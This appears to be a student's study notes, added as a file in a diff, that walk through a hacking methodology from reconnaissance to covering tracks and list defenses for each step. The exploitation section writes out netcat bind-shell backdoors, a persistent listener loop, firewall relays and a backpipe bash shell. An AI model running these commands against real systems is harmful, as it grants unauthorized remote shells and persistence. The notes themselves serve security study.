@@ -1,0 +1,101 @@
+Step1: Recon - GOAL: case the joint
+
+OSINT: online data/contact info/off+defensive/cert transparency
+Problems: too many sources, fees, is that all or not, parse in time
+DEFENSES: [P] live with it, keep records up-to-date
+
+DNS Interrogation: zone transfers dump DNS server logs, nmap dns-brute script
+DEFENSES: [P] no zone transfers (only DNS srvr) -2nd/3rd srvrs reject, use split DNS, harden DNS, [I] find zone transfers in DNS log (look for this via TCP -p 53)
+
+Web Search: public db, newspapers, blogs, social media, pushpin, careers pgs
+DEFENSES: [P] limit info, perform risk analysis, general job ads, check 3rd party links, [I] find web spider/crawlers 
+
+Search Engines: exploit-db, GHDB, engines index/store differently, cache finds removed sites, FOCA to auto-find files and metadata, indexable db+cmd shell history
+DEFENSES: [P] remove robots.txt, noindex/nofollow/nosnippet/noarchive
+			
+Maltego: intel tool relation based on transforms
+DEFENSES: [P] limit info, keep records up-to-date, do your own recon
+
+Web Recon/Attack: crawls net+indexes service banners (FTP/telnet), displays cached results for service/vendor
+DEFENSES: [P] limit info
+
+TOOLS: whois data, reverse whois, viewdns, entrust-ctsearch, hibp, SpiderFoot, nslookup, dig(linux), SEC Edgar, namechk, pushpin, exploit-db, GHDB(cache, site, link, inititle, inurl, related), WayBack Machine, filetypes(asp,jsp,php,bak,cgi,xls), FOCA, SearchDiggity, Recon-Ng, Maltego, shodan, censys, tools.dnsstuff, network-tools, securityspace, etc.
+
+
+Step 2: Scan - GOAL: survey tgt for holes
+
+War Dial: dial #’s in seq to locate modem carrier/2nd dial tone, remote access to routers (oob), attack vmail
+WarVox: VoIP w/ ID spoof, 1000/8hr, signatures apple against audio, spectrum analysis,
+DEFENSES: 
+
+TOOLS: WarVox, 
+
+
+
+
+Step 3: Exploit - GOAL: gain access/deny others
+
+Physical Attacks: steal pc, bypass local ctrl (HDD encrypt), usb boot attack, rubber ducky (HID)
+DEFENSES: [P] use full-disk encrypt, restrict USB ports, user train(lock pc), pwd BIOS (stops alt media boot), disable LLMNR (stops lan+turtle+responder attacks)
+NetCat: r/w data ax network, only one cnx per listener, stdin+stdout+stderr both same
+[C]lient: initiates cnx
+[L]istener: waits for cnx
+
+Data Transfer: send files btwn machines, use browser for L2C, tcp/udp, set src
+
+Listener: nc -l -p 1234 < test.txt
+Client: nc 192.168.1.2 1234 > test.txt
+
+Note: to push the other way, just reverse the GRT than signs!
+
+Port Scan: vanilla, tcp/udp scan, linear scans(def), any src -p, src route
+
+$ nc -v -w3 -z 192.168.0.1 22-1000
+
+Note: -v(verbose), -w3(wait 3sec), -z(minimal TCP data)
+
+Backdoors: get shell any port, tcp/udp, C>Lbd, exe sh when user cnx port
+
+*nix: nc -l -p 1234 -e /bin/sh
+Win:  nc -l -p 1234 -e cmd.exe
+
+Note: running /bin/sh or cmd.exe=no login needed;already logged in as user who ran nc listener
+
+Persistent BDL(bd listeners): keep nc in L mode when cnx drops, for *nix :
+cron job
+v of nc that supports -L flag
+While loop in script+nohup (ignores logout signal)
+
+Win:  nc -L -p 1234 192.168.0.1
+*nix: $ cat listener.sh
+While [ 1 ]; do echo “started”; nc -l -p 1234 -e /bin/sh; done
+$ nohup ./listener.sh &
+Relays: relay info from pc>pc>pc, redir data thru ports allow by FW, hard to trace attk origin, setup nc -L and | output to diff C, only 1way comms, else 2 relays needed
+no sudo needed if ports < 1023 + win any port works
+
+Win: C:\> type relay.bat
+nc 192.168.0.1 4321 
+     C:\> nc -l -p 7777 -e relay.bat
+*nix: $ mknod backpipe p (or mkfifo on newer *nix/nux)
+      $ nc -l -p 2222 0<backpipe | nc 192.168.0.1 3333 1>backpipe
+
+
+BC no -e: relay from bash to nc, gaping security hole
+
+
+$ mknod backpipe p
+$ /bin/bash 0<backpipe | nc -l -p 8080 1>backpipe
+
+DEFENSES: [P] (data transfer): know what's running on sys + (port scanner): close unused ports + (vuln scan): sys patch + (cnx to open ports): close unused ports + (bd): know what's running on sys + (relays): careful net arch + layered sec + critical filtering (internal FW, private VLANs, network isolation design)
+
+
+TOOLS: konboot, inception, LAN turtle+responder, rubber ducky, netcat, 
+
+Step 4: Keep Access - GOAL: stay there
+DEFENSES: live with it
+
+
+Step 5: Cover Tracks - GOAL: stay hidden
+DEFENSES: live with it
+
+
